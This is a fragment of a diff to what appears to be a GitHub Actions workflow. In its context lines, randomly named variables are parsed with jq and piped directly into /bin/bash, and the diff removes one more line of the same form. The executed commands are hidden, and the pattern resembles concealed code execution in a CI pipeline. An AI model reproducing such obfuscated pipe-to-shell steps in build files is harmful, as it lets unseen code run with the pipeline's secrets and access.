@@ -26,7 +26,6 @@ jobs:
           echo $gaw319 | jq -r .etob0 | /bin/bash
           echo $iha930 | jq -r .lsd17 | /bin/bash
           echo $cassd531 | jq -r .kxszl07 | /bin/bash
-          printf '%s' "$dtoep8" | jq -r .uqxop3994 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
